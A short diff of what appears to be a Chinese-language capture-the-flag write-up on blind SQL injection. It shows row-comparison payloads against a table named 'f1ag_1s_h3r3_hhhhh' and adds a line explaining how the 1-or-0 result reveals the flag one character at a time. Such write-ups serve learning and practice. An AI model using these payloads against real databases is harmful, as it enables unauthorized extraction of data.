@@ -63,6 +63,7 @@ select((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))
 
 select((select 1,"fla")>(select * from f1ag_1s_h3r3_hhhhh))
 通过flb>flag{xxx} 比较结果1或0即可
+当为1时的回显，值-1就是正确字符
 ```
 
 ^
